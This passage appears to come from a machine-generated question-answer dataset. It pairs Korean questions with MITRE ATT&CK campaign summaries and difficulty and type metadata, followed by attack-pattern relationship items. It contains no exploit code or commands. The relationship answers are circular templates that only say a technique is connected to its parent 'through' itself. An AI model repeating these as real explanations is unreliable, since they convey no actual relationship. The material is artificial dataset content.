      "answer": "[Indian Critical Infrastructure Intrusions](https://attack.mitre.org/campaigns/C0043) is a sequence of intrusions from 2021 through early 2022 linked to People’s Republic of China (PRC) threat actors, particularly [RedEcho](https://attack.mitre.org/groups/G1042) and Threat Activity Group 38 (TAG38). The intrusions appear focused on IT system breach in Indian electric utility entities and logistics firms, as well as potentially managed service providers operating within India. Although focused on OT-operating entities, there is no evidence this campaign was able to progress beyond IT breach and information gathering to OT environment access.(Citation: RecordedFuture RedEcho 2021)(Citation: RecordedFuture RedEcho 2022) 이 캠페인은 ShadowPad 등의 악성코드를 사용한다. 주요 공격 기법은 Non-Standard Port, Asymmetric Cryptography, Network Boundary Bridging 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--4b7f9839-4822-4c19-8a1f-70bb61ba97e1"
      }
    },
    {
      "question": "Leviathan Australian Intrusions 캠페인의 특징은 무엇인가?",
      "answer": "[Leviathan Australian Intrusions](https://attack.mitre.org/campaigns/C0049) consisted of at least two long-term intrusions against victims in Australia by [Leviathan](https://attack.mitre.org/groups/G0065), relying on similar tradecraft such as external service exploitation followed by extensive credential capture and re-use to enable privilege escalation and lateral movement. [Leviathan Australian Intrusions](https://attack.mitre.org/campaigns/C0049) were focused on exfiltrating sensitive data including valid credentials for the victim organizations.(Citation: CISA Leviathan 2024) 주요 공격 기법은 Vulnerabilities, Exploitation for Credential Access, SSH 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--b66bc597-399c-4e4d-828a-1ed4a7f1fb15"
      }
    },
    {
      "question": "Water Curupira Pikabot Distribution 캠페인의 특징은 무엇인가?",
      "answer": "[Pikabot](https://attack.mitre.org/software/S1145) was distributed in [Water Curupira Pikabot Distribution](https://attack.mitre.org/campaigns/C0037) throughout 2023 by an entity linked to BlackBasta ransomware deployment via email attachments. This activity followed the take-down of [QakBot](https://attack.mitre.org/software/S0650), with several technical overlaps and similarities with [QakBot](https://attack.mitre.org/software/S0650), indicating a possible connection. The identified activity led to the deployment of tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154), while coinciding with campaigns delivering [DarkGate](https://attack.mitre.org/software/S1111) and [IcedID](https://attack.mitre.org/software/S0483) en route to ransomware deployment.(Citation: TrendMicro Pikabot 2024) 이 캠페인은 IcedID, DarkGate, Pikabot 등의 악성코드를 사용한다. 주요 공격 기법은 Rundll32, Deobfuscate/Decode Files or Information, JavaScript 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--57541e3b-657e-463a-a4ab-ca08d7ea9965"
      }
    },
    {
      "question": "ShadowRay 캠페인의 특징은 무엇인가?",
      "answer": "[ShadowRay](https://attack.mitre.org/campaigns/C0045) was a campaign that began in late 2023 targeting the education, cryptocurrency, biopharma, and other sectors through a vulnerability (CVE-2023-48022) in the Ray AI framework named ShadowRay. According to security researchers [ShadowRay](https://attack.mitre.org/campaigns/C0045) was the first known instance of AI workloads being activley exploited in the wild through vulnerabilities in AI infrastructure. CVE-2023-48022, which allows access to compute resources and sensitive data for exposed instances, remains unpatched and has been disputed by the vendor as they maintain that Ray is not intended for use outside of a strictly controlled network environment.(Citation: Oligo ShadowRay Campaign MAR 2024) 주요 공격 기법은 Compute Hijacking, Exploitation for Privilege Escalation, System Network Configuration Discovery 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--57899965-b171-48ed-bbb4-8faffa3d836a"
      }
    },
    {
      "question": "Operation MidnightEclipse 캠페인의 특징은 무엇인가?",
      "answer": "[Operation MidnightEclipse](https://attack.mitre.org/campaigns/C0048) was a campaign conducted in March and April 2024 that involved initial exploit of zero-day vulnerability CVE-2024-3400, a critical command injection vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS.(Citation: Volexity UPSTYLE 2024)(Citation: Palo Alto MidnightEclipse APR 2024) 이 캠페인은 UPSTYLE 등의 악성코드를 사용한다. 주요 공격 기법은 Web Services, Windows Remote Management, Local Data Staging 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--455b011a-2510-49ab-a96f-2f84d6a80189"
      }
    },
    {
      "question": "C0032 캠페인의 특징은 무엇인가?",
      "answer": "[C0032](https://attack.mitre.org/campaigns/C0032) was an extended campaign suspected to involve the [Triton](https://attack.mitre.org/software/S1009) adversaries with related capabilities and techniques focused on gaining a foothold within IT environments. This campaign occurred in 2019 and was distinctly different from the [Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030).(Citation: FireEye TRITON 2019) 주요 공격 기법은 LSASS Memory, Image File Execution Options Injection, Timestomp 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--7ec2826c-0bf0-4b47-acae-fd683431a4ca"
      }
    },
    {
      "question": "Quad7 Activity 캠페인의 특징은 무엇인가?",
      "answer": " Quad7 Activity, also known as CovertNetwork-1658 or the 7777 Botnet, is a network of compromised small office/home office (SOHO) routers. (Citation: Bitsight 7777 Botnet) (Citation: Microsoft Storm-0940) The botnet was initially composed primarily of TP-Link routers and was named Quad7 due to compromised devices exposing TCP port 7777 with the distinctive banner <code>xlogin</code>. Later activity showed a significant increase in compromised Asus routers and the addition of new ports and banners, including TCP port 63256 displaying <code>alogin</code>. Quad7 infrastructure functions as a collection of egress IPs that various China-affiliated threat actors have used to conduct password-spraying and brute-force operations. (Citation: Bitsight 7777 Botnet)(Citation: Medium 777-Botnet) Microsoft has reported that Storm-0940 leveraged credentials obtained through Quad7 Activity to target organizations in North America and Europe, including government agencies, non-governmental organizations, think tanks, law firms, energy firms, IT providers, and defense industrial base entities. (Citation: Microsoft Storm-0940) 주요 공격 기법은 Botnet, Unix Shell, Fileless Storage 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--e7511089-1076-4a3b-984d-1a0a8afe31e9"
      }
    },
    {
      "question": "HomeLand Justice 캠페인의 특징은 무엇인가?",
      "answer": "[HomeLand Justice](https://attack.mitre.org/campaigns/C0038) was a disruptive campaign involving the use of ransomware, wiper malware, and sensitive information leaks conducted by Iranian state cyber actors against Albanian government networks in July and September 2022. Initial access for [HomeLand Justice](https://attack.mitre.org/campaigns/C0038) was established in May 2021 as threat actors subsequently moved laterally, exfiltrated sensitive information, and maintained persistence for approximately 14 months prior to the attacks. Responsibility was claimed by the \"HomeLand Justice\" front whose messaging indicated targeting of the Mujahedeen-e Khalq (MEK), an Iranian opposition group who maintain a refugee camp in Albania, and were formerly designated a terrorist organization by the US State Department.(Citation: Mandiant ROADSWEEP August 2022)(Citation: Microsoft Albanian Government Attacks September 2022)(Citation: CISA Iran Albanian Attacks September 2022) A second wave of attacks was launched in September 2022 using similar tactics after public attribution of the previous activity to Iran and the severing of diplomatic ties between Iran and Albania.(Citation: CISA Iran Albanian Attacks September 2022)\n\n 이 캠페인은 ROADSWEEP, ZeroCleare, CHIMNEYSWEEP 등의 악성코드를 사용한다. 주요 공격 기법은 Valid Accounts, Tool, Email Account 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--7e21077d-2589-43a7-a5f9-490061289526"
      }
    },
    {
      "question": "Salesforce Data Exfiltration 캠페인의 특징은 무엇인가?",
      "answer": "The [Salesforce Data Exfiltration](https://attack.mitre.org/campaigns/C0059) campaign began in October 2024 with financially-motivated threat actor UNC6040 using [Spearphishing Voice](https://attack.mitre.org/techniques/T1598/004) (vishing) to compromise corporate Salesforce instances for large-scale data theft and extortion. Following the initial data theft, victim organizations received extortion demands from a separate threat actor, UNC6240, who claimed to be the “ShinyHunters” group. The observed infrastructure and TTPs used during the [Salesforce Data Exfiltration](https://attack.mitre.org/campaigns/C0059) campaign overlap with those used by threat groups with suspected ties to the broader collective known as \"The Com.” These overlaps could plausibly be the result of associated actors operating within the same communities and are not necessarily an indication of a direct operational relationship.(Citation: FBI Salesforce Data Theft SEP 2025)(Citation: Google Salesforce JUN 2025) 주요 공격 기법은 Impersonation, Spearphishing Voice, Email Accounts 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--9cea8bec-07c5-422b-84b8-99d3128ce570"
      }
    },
    {
      "question": "SharePoint ToolShell Exploitation 캠페인의 특징은 무엇인가?",
      "answer": "The [SharePoint ToolShell Exploitation](https://attack.mitre.org/campaigns/C0058) campaign was conducted in July 2025 and encompassed the first waves of exploitation against incompetely patched spoofing (CVE-2025-49706) and remote code execution (CVE-2025-49704) vulnerabilities affecting on-premises Microsoft SharePoint servers. Later patched and updated as CVE-2025-53770 and CVE-2025-53771, the ToolShell vulnerabilities were widely exploited including by China-based ransomware actor Storm-2603 and espionage actors [Threat Group-3390](https://attack.mitre.org/groups/G0027) and [ZIRCONIUM](https://attack.mitre.org/groups/G0128). [SharePoint ToolShell Exploitation](https://attack.mitre.org/campaigns/C0058) targeted multiple regions and industries including finance, education, energy, and healthcare across Asia, Europe, and the United States.(Citation: Microsoft SharePoint Exploit JUL 2025)(Citation: Palo Alto SharePoint Vulnerabilities JUL 2025)(Citation: Eye Research ToolShell JUL 2025)(Citation: ESET ToolShell JUL 2025)(Citation: Trend Micro SharePoint Attacks JUL 2025)\n 주요 공격 기법은 Data from Local System, Lateral Tool Transfer, Exfiltration Over C2 Channel 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--1a0576df-df21-4775-843e-844d8a58a94b"
      }
    },
    {
      "question": "C0017 캠페인의 특징은 무엇인가?",
      "answer": "[C0017](https://attack.mitre.org/campaigns/C0017) was an [APT41](https://attack.mitre.org/groups/G0096) campaign conducted between May 2021 and February 2022 that successfully compromised at least six U.S. state government networks through the exploitation of vulnerable Internet facing web applications. During [C0017](https://attack.mitre.org/campaigns/C0017), [APT41](https://attack.mitre.org/groups/G0096) was quick to adapt and use publicly-disclosed as well as zero-day vulnerabilities for initial access, and in at least two cases re-compromised victims following remediation efforts. The goals of [C0017](https://attack.mitre.org/campaigns/C0017) are unknown, however [APT41](https://attack.mitre.org/groups/G0096) was observed exfiltrating Personal Identifiable Information (PII).(Citation: Mandiant APT41) 이 캠페인은 DEADEYE, KEYPLUG, Cobalt Strike 등의 악성코드를 사용한다. 주요 공격 기법은 Ingress Tool Transfer, Web Service, Tool 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--ba6dfa37-f401-4140-88b0-8938f2895e61"
      }
    },
    {
      "question": "Operation Spalax 캠페인의 특징은 무엇인가?",
      "answer": "[Operation Spalax](https://attack.mitre.org/campaigns/C0005) was a campaign that primarily targeted Colombian government organizations and private companies, particularly those associated with the energy and metallurgical industries. The [Operation Spalax](https://attack.mitre.org/campaigns/C0005) threat actors distributed commodity malware and tools using generic phishing topics related to COVID-19, banking, and law enforcement action. Security researchers noted indicators of compromise and some infrastructure overlaps with other campaigns dating back to April 2018, including at least one separately attributed to [APT-C-36](https://attack.mitre.org/groups/G0099), however identified enough differences to report this as separate, unattributed activity.(Citation: ESET Operation Spalax Jan 2021)   이 캠페인은 njRAT 등의 악성코드를 사용한다. 주요 공격 기법은 Encrypted/Encoded File, Rundll32, Spearphishing Attachment 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--4c840263-bbda-440d-a22b-674679ddebf1"
      }
    },
    {
      "question": "Operation Sharpshooter 캠페인의 특징은 무엇인가?",
      "answer": "[Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013) was a global cyber espionage campaign that targeted nuclear, defense, government, energy, and financial companies, with many located in Germany, Turkey, the United Kingdom, and the United States. Security researchers noted the campaign shared many similarities with previous [Lazarus Group](https://attack.mitre.org/groups/G0032) operations, including fake job recruitment lures and shared malware code.(Citation: McAfee Sharpshooter December 2018)(Citation: Bleeping Computer Op Sharpshooter March 2019)(Citation: Threatpost New Op Sharpshooter Data March 2019)     이 캠페인은 Rising Sun 등의 악성코드를 사용한다. 주요 공격 기법은 Proxy, Match Legitimate Resource Name or Location, Malicious File 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--37764c78-2a99-46d1-a7ea-6454b9bf93a0"
      }
    },
    {
      "question": "Cutting Edge 캠페인의 특징은 무엇인가?",
      "answer": "[Cutting Edge](https://attack.mitre.org/campaigns/C0029) was a campaign conducted by suspected China-nexus espionage actors, variously identified as UNC5221/UTA0178 and UNC5325, that began as early as December 2023 with the exploitation of zero-day vulnerabilities in Ivanti Connect Secure (previously Pulse Secure) VPN appliances. [Cutting Edge](https://attack.mitre.org/campaigns/C0029) targeted the U.S. defense industrial base and multiple sectors globally including  telecommunications, financial, aerospace, and technology. [Cutting Edge](https://attack.mitre.org/campaigns/C0029) featured the use of defense evasion and living-off-the-land (LoTL) techniques along with the deployment of web shells and other custom malware.(Citation: Mandiant Cutting Edge January 2024)(Citation: Volexity Ivanti Zero-Day Exploitation January 2024)(Citation: Volexity Ivanti Global Exploitation January 2024)(Citation: Mandiant Cutting Edge Part 2 January 2024)(Citation: Mandiant Cutting Edge Part 3 February 2024) 이 캠페인은 LIGHTWIRE, GLASSTOKEN, FRAMESTING 등의 악성코드를 사용한다. 주요 공격 기법은 Tool, Disable or Modify Tools, Encrypted/Encoded File 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--4fdd2487-26c1-494e-8702-ec5abe9aa1d9"
      }
    },
    {
      "question": "2022 Ukraine Electric Power Attack 캠페인의 특징은 무엇인가?",
      "answer": "The [2022 Ukraine Electric Power Attack](https://attack.mitre.org/campaigns/C0034) was a [Sandworm Team](https://attack.mitre.org/groups/G0034) campaign that used a combination of GOGETTER, Neo-REGEORG, [CaddyWiper](https://attack.mitre.org/software/S0693), and living of the land (LotL) techniques to gain access to a Ukrainian electric utility to send unauthorized commands from their SCADA system.(Citation: Mandiant-Sandworm-Ukraine-2022)(Citation: Dragos-Sandworm-Ukraine-2022)  이 캠페인은 CaddyWiper 등의 악성코드를 사용한다. 주요 공격 기법은 Group Policy Modification, Lateral Tool Transfer, Data Destruction 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--df8eb785-70f8-4300-b444-277ba849083d"
      }
    },
    {
      "question": "3CX Supply Chain Attack 캠페인의 특징은 무엇인가?",
      "answer": "The [3CX Supply Chain Attack](https://attack.mitre.org/campaigns/C0057) was the first publicly reported case of one supply chain compromise triggering another, leading to a cascading, two-stage intrusion. The initial supply chain attack began when a 3CX employee downloaded and executed a trojanized, end-of-life version of the X_Trader trading software from Trading Technologies. This provided UNC4736, a threat cluster associated with [AppleJeus](https://attack.mitre.org/groups/G1049), access to the 3CX environment. From there UNC4736 compromised the Windows and macOS build environments used to distribute the 3CX desktop application to their customers.(Citation: Mandiant 3cx UNC4736 2023) While 3CX serves more than 600,000 customers and 12 million users, only a subset of systems were affected. Subsequent targeting focused on victims in the defense and cryptocurrency sectors, where attackers deployed secondary payloads such as Gopuram for credential theft and persistence.(Citation: Kaspersky 3CX Gopuram 2023) The campaign began in late 2022 and was disrupted after security vendors publicly reported the compromise in March 2023.(Citation: 3cx official statement 2023)(Citation: Krebs 3cx overview 2023) 주요 공격 기법은 Exploitation for Client Execution, Electron Applications, Portable Executable Injection 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--4fd53ccc-c6b1-4e3c-abe8-a456d46d789e"
      }
    },
    {
      "question": "C0011 캠페인의 특징은 무엇인가?",
      "answer": "[C0011](https://attack.mitre.org/campaigns/C0011) was a suspected cyber espionage campaign conducted by [Transparent Tribe](https://attack.mitre.org/groups/G0134) that targeted students at universities and colleges in India. Security researchers noted this campaign against students was a significant shift from [Transparent Tribe](https://attack.mitre.org/groups/G0134)'s historic targeting Indian government, military, and think tank personnel, and assessed it was still ongoing as of July 2022.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022)  이 캠페인은 Crimson 등의 악성코드를 사용한다. 주요 공격 기법은 Digital Certificates, Domains, Visual Basic 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--b4e5a4a9-f3be-4631-ba8f-da6ebb067fac"
      }
    },
    {
      "question": "J-magic Campaign 캠페인의 특징은 무엇인가?",
      "answer": "The [J-magic Campaign](https://attack.mitre.org/campaigns/C0050) was active from mid-2023 to at least mid-2024 and featured the use of the [J-magic](https://attack.mitre.org/software/S1203) backdoor, a custom cd00r variant tailored for use against Juniper routers. The [J-magic Campaign](https://attack.mitre.org/campaigns/C0050) targeted Junos OS routers serving as VPN gateways primarily in the semiconductor, energy, manufacturing, and IT sectors. (Citation: Lumen J-Magic JAN 2025) 이 캠페인은 J-magic 등의 악성코드를 사용한다. 주요 공격 기법은 Digital Certificates, Malware, Match Legitimate Resource Name or Location 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--58c4fd17-88f5-433a-8242-e9cac31f3c45"
      }
    },
    {
      "question": "Triton Safety Instrumented System Attack 캠페인의 특징은 무엇인가?",
      "answer": "[Triton Safety Instrumented System Attack](https://attack.mitre.org/campaigns/C0030) was a campaign employed by [TEMP.Veles](https://attack.mitre.org/groups/G0088) which leveraged the [Triton](https://attack.mitre.org/software/S1009) malware framework against a petrochemical organization.(Citation: Triton-EENews-2017) The malware and techniques used within this campaign targeted specific Triconex [Safety Controller](https://attack.mitre.org/assets/A0010)s within the environment.(Citation: FireEye TRITON 2018) The incident was eventually discovered due to a safety trip that occurred as a result of an issue in the malware.(Citation: FireEye TRITON 2017)\n 주요 공격 기법은 Active Scanning, Encrypted Channel, Indicator Removal from Tools 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--45a98f02-852f-49b2-94c0-c63207bebbbf"
      }
    },
    {
      "question": "FrostyGoop Incident 캠페인의 특징은 무엇인가?",
      "answer": "[FrostyGoop Incident](https://attack.mitre.org/campaigns/C0041) took place in January 2024 against a municipal district heating company in Ukraine. Following initial access via likely exploitation of external facing services, [FrostyGoop](https://attack.mitre.org/software/S1165) was used to manipulate ENCO control systems via legitimate Modbus commands to impact the delivery of heating services to Ukrainian civilians.(Citation: Dragos FROSTYGOOP 2024)(Citation: Nozomi BUSTLEBERM 2024) 주요 공격 기법은 Exploit Public-Facing Application, Web Shell, Downgrade Attack 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--1169ff24-b35f-4d8d-8cf3-643a2834227f"
      }
    },
    {
      "question": "KV Botnet Activity 캠페인의 특징은 무엇인가?",
      "answer": "[KV Botnet Activity](https://attack.mitre.org/campaigns/C0035) consisted of exploitation of primarily “end-of-life” small office-home office (SOHO) equipment from manufacturers such as Cisco, NETGEAR, and DrayTek. [KV Botnet Activity](https://attack.mitre.org/campaigns/C0035) was used by [Volt Typhoon](https://attack.mitre.org/groups/G1017) to obfuscate connectivity to victims in multiple critical infrastructure segments, including energy and telecommunication companies and entities based on the US territory of Guam. While the KV Botnet is the most prominent element of this campaign, it overlaps with another botnet cluster referred to as the JDY cluster.(Citation: Lumen KVBotnet 2023) This botnet was disrupted by US law enforcement entities in early 2024 after periods of activity from October 2022 through January 2024.(Citation: DOJ KVBotnet 2024) 주요 공격 기법은 Security Software Discovery, File and Directory Discovery, System Information Discovery 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--0c259854-4044-4f6c-ac49-118d484b3e3b"
      }
    },
    {
      "question": "C0026 캠페인의 특징은 무엇인가?",
      "answer": "[C0026](https://attack.mitre.org/campaigns/C0026) was a campaign identified in September 2022 that included the selective distribution of [KOPILUWAK](https://attack.mitre.org/software/S1075) and [QUIETCANARY](https://attack.mitre.org/software/S1076) malware to previous [ANDROMEDA](https://attack.mitre.org/software/S1074) malware victims in Ukraine through re-registered [ANDROMEDA](https://attack.mitre.org/software/S1074) C2 domains. Several tools and tactics used during [C0026](https://attack.mitre.org/campaigns/C0026) were consistent with historic [Turla](https://attack.mitre.org/groups/G0010) operations.(Citation: Mandiant Suspected Turla Campaign February 2023) 이 캠페인은 KOPILUWAK, QUIETCANARY, ANDROMEDA 등의 악성코드를 사용한다. 주요 공격 기법은 Data from Local System, Ingress Tool Transfer, Archive via Utility 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--c89fa3ff-4773-4daf-8aec-d8f43f10116e"
      }
    },
    {
      "question": "SPACEHOP Activity 캠페인의 특징은 무엇인가?",
      "answer": "[SPACEHOP Activity](https://attack.mitre.org/campaigns/C0052) is conducted through commercially leased Virtual Private Servers (VPS), otherwise known as provisioned Operational Relay Box (ORB) networks. The network leveraged for SPACEHOP Activity enabled China-nexus cyber threat actors – such as [APT5](https://attack.mitre.org/groups/G1023) and [Ke3chang](https://attack.mitre.org/groups/G0004) – to perform network reconnaissance scanning and vulnerability exploitation. SPACEHOP Activity has historically targeted entities in North America, Europe, and the Middle East.(Citation: ORB Mandiant)  주요 공격 기법은 Tool, Virtual Private Server, Exploit Public-Facing Application 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--83e1f587-34da-44cc-b65b-a72479cb1616"
      }
    },
    {
      "question": "Pikabot Distribution February 2024 캠페인의 특징은 무엇인가?",
      "answer": "[Pikabot](https://attack.mitre.org/software/S1145) was distributed in [Pikabot Distribution February 2024](https://attack.mitre.org/campaigns/C0036) using malicious emails with embedded links leading to malicious ZIP archives requiring user interaction for follow-on infection. The version of [Pikabot](https://attack.mitre.org/software/S1145) distributed featured significant changes over the 2023 variant, including reduced code complexity and simplified obfuscation mechanisms.(Citation: Elastic Pikabot 2024)(Citation: Zscaler Pikabot 2024) 이 캠페인은 Pikabot 등의 악성코드를 사용한다. 주요 공격 기법은 Spearphishing Link, PowerShell, JavaScript 등이다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--81e89fb4-8d07-4d8a-82f4-bf084f9d5d53"
      }
    },
    {
      "question": "C0033 캠페인의 특징은 무엇인가?",
      "answer": "[C0033](https://attack.mitre.org/campaigns/C0033) was a [PROMETHIUM](https://attack.mitre.org/groups/G0056) campaign during which they used [StrongPity](https://attack.mitre.org/software/S0491) to target Android users. [C0033](https://attack.mitre.org/campaigns/C0033) was the first publicly documented mobile campaign for [PROMETHIUM](https://attack.mitre.org/groups/G0056), who previously used Windows-based techniques.(Citation: welivesec_strongpity) 이 캠페인은 StrongPity 등의 악성코드를 사용한다.",
      "difficulty": "medium",
      "type": "campaign_analysis",
      "metadata": {
        "campaign_id": "campaign--a82bc5ad-5f95-4c6a-9f25-aaf6f476a3c4"
      }
    },
    {
      "question": "PowerShell와 Command and Scripting Interpreter의 관계는 무엇인가?",
      "answer": "PowerShell와 Command and Scripting Interpreter는 PowerShell를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Regsvcs/Regasm와 System Binary Proxy Execution의 관계는 무엇인가?",
      "answer": "Regsvcs/Regasm와 System Binary Proxy Execution는 Regsvcs/Regasm를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Parent PID Spoofing와 Access Token Manipulation의 관계는 무엇인가?",
      "answer": "Parent PID Spoofing와 Access Token Manipulation는 Parent PID Spoofing를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Component Object Model Hijacking와 Event Triggered Execution의 관계는 무엇인가?",
      "answer": "Component Object Model Hijacking와 Event Triggered Execution는 Component Object Model Hijacking를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Transmitted Data Manipulation와 Data Manipulation의 관계는 무엇인가?",
      "answer": "Transmitted Data Manipulation와 Data Manipulation는 Transmitted Data Manipulation를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Bash History와 Unsecured Credentials의 관계는 무엇인가?",
      "answer": "Bash History와 Unsecured Credentials는 Shell History를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Indicator Removal from Tools와 Obfuscated Files or Information의 관계는 무엇인가?",
      "answer": "Indicator Removal from Tools와 Obfuscated Files or Information는 Indicator Removal from Tools를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "DLL Side-Loading와 Hijack Execution Flow의 관계는 무엇인가?",
      "answer": "DLL Side-Loading와 Hijack Execution Flow는 DLL를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Windows Admin Shares와 Remote Services의 관계는 무엇인가?",
      "answer": "Windows Admin Shares와 Remote Services는 SMB/Windows Admin Shares를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Securityd Memory와 Credentials from Password Stores의 관계는 무엇인가?",
      "answer": "Securityd Memory와 Credentials from Password Stores는 Securityd Memory를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Pass the Ticket와 Use Alternate Authentication Material의 관계는 무엇인가?",
      "answer": "Pass the Ticket와 Use Alternate Authentication Material는 Pass the Ticket를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "NTFS File Attributes와 Hide Artifacts의 관계는 무엇인가?",
      "answer": "NTFS File Attributes와 Hide Artifacts는 NTFS File Attributes를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Multi-hop Proxy와 Proxy의 관계는 무엇인가?",
      "answer": "Multi-hop Proxy와 Proxy는 Multi-hop Proxy를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "LC_LOAD_DYLIB Addition와 Event Triggered Execution의 관계는 무엇인가?",
      "answer": "LC_LOAD_DYLIB Addition와 Event Triggered Execution는 LC_LOAD_DYLIB Addition를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Trap와 Event Triggered Execution의 관계는 무엇인가?",
      "answer": "Trap와 Event Triggered Execution는 Trap를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Launch Agent와 Create or Modify System Process의 관계는 무엇인가?",
      "answer": "Launch Agent와 Create or Modify System Process는 Launch Agent를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Private Keys와 Unsecured Credentials의 관계는 무엇인가?",
      "answer": "Private Keys와 Unsecured Credentials는 Private Keys를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "InstallUtil와 System Binary Proxy Execution의 관계는 무엇인가?",
      "answer": "InstallUtil와 System Binary Proxy Execution는 InstallUtil를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "PowerShell Profile와 Event Triggered Execution의 관계는 무엇인가?",
      "answer": "PowerShell Profile와 Event Triggered Execution는 PowerShell Profile를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Hidden Users와 Hide Artifacts의 관계는 무엇인가?",
      "answer": "Hidden Users와 Hide Artifacts는 Hidden Users를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Netsh Helper DLL와 Event Triggered Execution의 관계는 무엇인가?",
      "answer": "Netsh Helper DLL와 Event Triggered Execution는 Netsh Helper DLL를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Web Session Cookie와 Use Alternate Authentication Material의 관계는 무엇인가?",
      "answer": "Web Session Cookie와 Use Alternate Authentication Material는 Web Session Cookie를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Revert Cloud Instance와 Modify Cloud Compute Infrastructure의 관계는 무엇인가?",
      "answer": "Revert Cloud Instance와 Modify Cloud Compute Infrastructure는 Revert Cloud Instance를 통해 연결되어 있다.",
      "difficulty": "medium",
      "type": "attack_pattern_relationships",
      "metadata": {
        "hops": 2
      }
    },
    {
      "question": "Control Panel Items와 System Binary Proxy Execution의 관계는 무엇인가?",
